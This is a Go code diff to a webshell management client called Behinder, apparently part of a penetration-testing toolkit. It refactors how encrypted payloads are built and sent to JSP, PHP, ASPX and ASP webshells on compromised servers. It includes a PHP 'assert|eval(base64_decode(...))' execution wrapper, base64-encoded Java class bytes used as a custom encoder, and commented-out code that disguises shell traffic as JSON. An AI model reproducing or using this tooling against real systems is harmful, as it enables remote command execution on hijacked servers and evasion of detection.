@@ -30,6 +30,7 @@ type Behinder struct {
 	Headers       map[string]string
 	Client        *http.Client
 	CustomEncoder EncoderFunc
+	CustomDecoder EncoderFunc
 }
 
 func NewBehinder(ys *ypb.WebShell) (*Behinder, error) {
@@ -47,11 +48,10 @@ func NewBehinder(ys *ypb.WebShell) (*Behinder, error) {
 	}
 	// 默认的加密方式
 	bs.CustomEncoder = func(raw []byte) ([]byte, error) {
-		payload, err := behinder.Encryption(raw, bs.SecretKey, bs.ShellScript)
-		if err != nil {
-			return nil, err
-		}
-		return payload, nil
+		return bs.enCryption(raw)
+	}
+	bs.CustomDecoder = func(raw []byte) ([]byte, error) {
+		return bs.deCryption(raw)
 	}
 	bs.setHeaders()
 	//if len(bs.Proxy) != 0 {
@@ -87,38 +87,36 @@ func (b *Behinder) setHeaders() {
 //}
 
 func (b *Behinder) getPayload(binCode behinder.Payload, params map[string]string) ([]byte, error) {
-	var code []byte
+	var rawPayload []byte
 	var err error
 	hexCode := behinder.HexPayload[b.ShellScript][binCode]
 	switch b.ShellScript {
 	case ypb.ShellScript_JSPX.String():
 		fallthrough
 	case ypb.ShellScript_JSP.String():
-		code, err = behinder.GetRawClass(hexCode, params)
+		rawPayload, err = behinder.GetRawClass(hexCode, params)
 		if err != nil {
 			return nil, err
 		}
 	case ypb.ShellScript_PHP.String():
-		code, err = behinder.GetRawPHP(hexCode, params)
+		rawPayload, err = behinder.GetRawPHP(hexCode, params)
 		if err != nil {
 			return nil, err
 		}
-		//code = []byte(("lasjfadfas.assert|eval(base64_decode('" + string(bincls) + "'));"))
-		code = []byte(("assert|eval(base64_decode('" + base64.StdEncoding.EncodeToString(code) + "'));"))
+		//rawPayload = []byte(("lasjfadfas.assert|eval(base64_decode('" + string(bincls) + "'));"))
+		rawPayload = []byte(("assert|eval(base64_decode('" + base64.StdEncoding.EncodeToString(rawPayload) + "'));"))
 	case ypb.ShellScript_ASPX.String():
-		code, err = behinder.GetRawAssembly(hexCode, params)
+		rawPayload, err = behinder.GetRawAssembly(hexCode, params)
 		if err != nil {
 			return nil, err
 		}
 	case ypb.ShellScript_ASP.String():
-		code, err = behinder.GetRawASP(hexCode, params)
+		rawPayload, err = behinder.GetRawASP(hexCode, params)
 		if err != nil {
 			return nil, err
 		}
 	}
-	return b.CustomEncoder(code)
-	//return code, nil
-	//return b.Encoder(nativeCryption())
+	return b.CustomEncoder(rawPayload)
 }
 
 // 原生的加密方式
@@ -160,33 +158,26 @@ func (b *Behinder) post(data []byte) ([]byte, error) {
 	for k, v := range b.Headers {
 		request.Header.Set(k, v)
 	}
+
 	lresp, err := lowhttp.HTTP(
 		lowhttp.WithRequest(request),
 		lowhttp.WithVerifyCertificate(false),
 		lowhttp.WithTimeoutFloat(15),
 		lowhttp.WithProxy(b.Proxy),
+		//lowhttp.WithBeforeDoRequest(func(oringe []byte) []byte {
+		//	_, body := lowhttp.SplitHTTPHeadersAndBodyFromPacket(oringe)
+		//	jsonStr := `{"id":"1","body":{"user":"lucky"}}`
+		//	encodedData := base64.StdEncoding.EncodeToString(body)
+		//	encodedData = strings.ReplaceAll(encodedData, "+", "<")
+		//	encodedData = strings.ReplaceAll(encodedData, "/", ">")
+		//	jsonStr = strings.ReplaceAll(jsonStr, "lucky", encodedData)
+		//	res := lowhttp.ReplaceHTTPPacketBody(oringe, []byte(jsonStr), false)
+		//
+		//	return res
+		//}),
 	)
 
-	//resp, err := b.Client.Do(request)
-	//if err != nil {
-	//	return nil, err
-	//}
-	//defer func(Body io.ReadCloser) {
-	//	err := Body.Close()
-	//	if err != nil {
-	//		log.Error(err)
-	//	}
-	//}(resp.Body)
-	//raw, err := ioutil.ReadAll(resp.Body)
-	//if err != nil {
-	//	return nil, err
-	//}
-	//raw = bytes.TrimRight(raw, "\r\n\r\n")
-	//if len(raw) == 0 {
-	//	return nil, utils.Error("返回数据为空")
-	//}
-
-	_, raw := lowhttp.SplitHTTPHeadersAndBodyFromPacket(lresp.RawPacket)
+	raw := lowhttp.GetHTTPPacketBody(lresp.RawPacket)
 
 	return raw, nil
 }
@@ -196,7 +187,7 @@ func (b *Behinder) sendPayload(data []byte) ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	return b.deCryption(body)
+	return b.CustomDecoder(body)
 }
 
 //func (b *Behinder) Encoder(encoderFunc EncoderFunc) ([]byte, error) {
@@ -207,6 +198,10 @@ func (b *Behinder) sendPayload(data []byte) ([]byte, error) {
 
 func (b *Behinder) Encoder(f func(raw []byte) ([]byte, error)) {
 	b.CustomEncoder = f
+}
+
+func (b *Behinder) Decoder(f func(raw []byte) ([]byte, error)) {
+	b.CustomDecoder = f
 }
 
 func (b *Behinder) Unmarshal(bts []byte, m map[string]string) error {
@@ -236,6 +231,8 @@ func (b *Behinder) String() string {
 func (b *Behinder) Ping(opts ...behinder.ParamsConfig) (bool, error) {
 	params := map[string]string{
 		"content": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+		//"CustomEncoder": "yv66vgAAADMAHgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWBwAIAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgoABwAKDAAFAAsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYKAAcADQwADgAPAQAHcmV2ZXJzZQEAGigpTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7CgAHABEMABIAEwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsJABUAFgcAFwwAGAAZAQAPQXNvdXRwdXRSZXZlcnNlAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQAhABUAAgAAAAEAAAAYABkAAAACAAEABQALAAEAGgAAADcABAACAAAAFyq3AAEquwAHWSu3AAm2AAy2ABC1ABSxAAAAAQAbAAAADgADAAAABAAEAAUAFgAGAAEAEgATAAEAGgAAAB0AAQABAAAABSq0ABSwAAAAAQAbAAAABgABAAAACgABABwAAAACAB0=",
+		"CustomEncoder": "yv66vgAAADMANAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAieyJpZCI6IjEiLCJib2R5Ijp7InVzZXIiOiJsdWNreSJ9fQgACgEABWx1Y2t5CgAMAA0HAA4MAA8AEAEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXRFbmNvZGVyAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwoAEgATBwAUDAAVABYBABhqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXIBAA5lbmNvZGVUb1N0cmluZwEAFihbQilMamF2YS9sYW5nL1N0cmluZzsIABgBAAErCAAaAQABPAoAHAAdBwAeDAAfACABABBqYXZhL2xhbmcvU3RyaW5nAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7CAAiAQABLwgAJAEAAT4JACYAJwcAKAwAKQAqAQAPQXNvdXRwdXRSZXZlcnNlAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAFKFtCKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQEADElubmVyQ2xhc3NlcwEAB0VuY29kZXIAIQAmAAIAAAABAAAAKQAqAAAAAgABAAUAKwABACwAAABRAAUAAwAAACkqtwABEgdNLBIJuAALK7YAERIXEhm2ABsSIRIjtgAbtgAbTSostQAlsQAAAAEALQAAABYABQAAAAQABAAFAAcABgAjAAcAKAAIAAEALgAvAAEALAAAAB0AAQABAAAABSq0ACWwAAAAAQAtAAAABgABAAAADAACADAAAAACADEAMgAAAAoAAQASAAwAMwAJ",
 	}
 	params = behinder.ProcessParams(params, opts...)
 
@@ -243,11 +240,8 @@ func (b *Behinder) Ping(opts ...behinder.ParamsConfig) (bool, error) {
 	if err != nil {
 		return false, err
 	}
-	body, err := b.post(payload)
-	if err != nil {
-		return false, err
-	}
-	res, err := b.deCryption(body)
+
+	res, err := b.sendPayload(payload)
 	if err != nil {
 		return false, err
 	}
